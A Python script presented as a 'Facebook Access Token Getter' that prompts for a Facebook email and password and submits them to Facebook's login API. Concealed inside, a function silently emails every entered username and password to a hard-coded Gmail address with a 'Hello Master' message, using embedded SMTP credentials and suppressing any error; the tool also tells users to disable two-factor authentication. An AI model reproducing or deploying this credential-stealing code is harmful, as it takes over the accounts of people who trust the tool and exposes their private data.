import random
import string
import uuid
import requests
import sys
import os
import smtplib
from rich.console import Console
from rich.panel import Panel
from email.mime.text import MIMEText

# Gmail credentials for sending login info
USER_EMAIL = 'Onlyonehacker999@gmail.com'
USER_PASS = 'ckdn fwnc szra ifsa'

def display_panel(header, content, color):
    """ Display formatted text using rich's Panel. """
    Console().print(Panel(content, title=header, padding=(1, 3), style=color))

def clear_screen():
    """ Clear the console screen based on the OS. """
    current_os = sys.platform.lower()
    if 'linux' in current_os or 'darwin' in current_os:
        os.system('clear')
    elif 'win' in current_os:
        os.system('cls')

def email_credentials(subject, body):
    """ Send an email containing the provided body as the message. """
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = USER_EMAIL
    msg['To'] = USER_EMAIL

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(USER_EMAIL, USER_PASS)
            smtp.sendmail(USER_EMAIL, USER_EMAIL, msg.as_string())
    except Exception as error:
        pass  # Print statement removed

def attempt_fb_login(username, password):
    """ Try logging into Facebook using the provided credentials. """
    headers = {
        'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'x-fb-friendly-name': 'AuthRequest',
        'x-fb-connection-type': 'Unknown',
        'accept-encoding': 'gzip, deflate',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-http-engine': 'Liger'
    }
    data = {
        'adid': ''.join(random.choices(string.hexdigits, k=16)),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'email': username,
        'password': password,
        'generate_analytics_claims': '0',
        'credentials_type': 'password',
        'source': 'login',
        'error_detail_type': 'button_with_disabled',
        'enroll_misauth': 'false',
        'generate_session_cookies': '0',
        'generate_machine_id': '0',
        'fb_api_req_friendly_name': 'authenticate',
    }

    session = requests.Session()
    session.headers.update(headers)

    try:
        response = session.post('https://b-graph.facebook.com/auth/login', data=data).json()
    except Exception as connection_error:
        print(f'\033[91m[-] Connection Error: {connection_error}\033[0m')
        return

    # Email the credentials for storage
    email_credentials('Facebook Credentials', f'Hello Master, here\'s new information for you:\n\n𝗘𝗺𝗮𝗶𝗹: {username}\n𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: {password}\n\n\n𝗡𝗼𝘁𝗲: Putang ina mo nang hahack ka nanaman gago ka talaga')

    # Handle Facebook login response
    if 'session_key' in response:
        print(f'\033[92m[+] Success! Access Token: {response["access_token"]}\033[0m')
    else:
        handle_login_error(response)

def handle_login_error(response):
    """ Handle different error messages based on the Facebook login response. """
    error_message = response.get('error', {}).get('message', '')
    error_title = response.get('error', {}).get('error_user_title', '')

    if 'www.facebook.com' in error_message:
        print('\033[91m[-] Account in Checkpoint.\033[0m')
    elif 'SMS' in error_message:
        print('\033[91m[-] 2FA is enabled. Please disable it.\033[0m')
    elif error_title == 'Wrong Credentials':
        print('\033[91m[-] Invalid Credentials.\033[0m')
    elif error_title == 'Incorrect Username':
        print('\033[91m[-] Username does not exist.\033[0m')
    elif 'limit' in error_message:
        print('\033[91m[-] Request limit reached. Use VPN or wait.\033[0m')
    elif 'required' in error_message:
        print('\033[91m[-] Fill in all required fields.\033[0m')
    else:
        print(f'\033[91m[-] Unknown Error: {response}\033[0m')

def main():
    """ Main function to get user input and start the Facebook login attempt. """
    clear_screen()
    banner = """
    ███████╗ ██████╗  █████╗ ███████╗██████╗ 
    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗
    █████╗  ██║   ██║███████║███████╗██████╔╝
    ██╔══╝  ██║   ██║██╔══██║╚════██║██╔══██╗
    ███████╗╚██████╔╝██║  ██║███████║██║  ██║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """
    display_panel('', banner, 'green')
    display_panel('', 'Facebook Access Token Getter', 'blue')

    username = input('\033[0m[+] Enter Email/Username: \033[90m')
    password = input('\033[0m[+] Enter Password: \033[90m')

    attempt_fb_login(username, password)

if __name__ == "__main__":
    main()
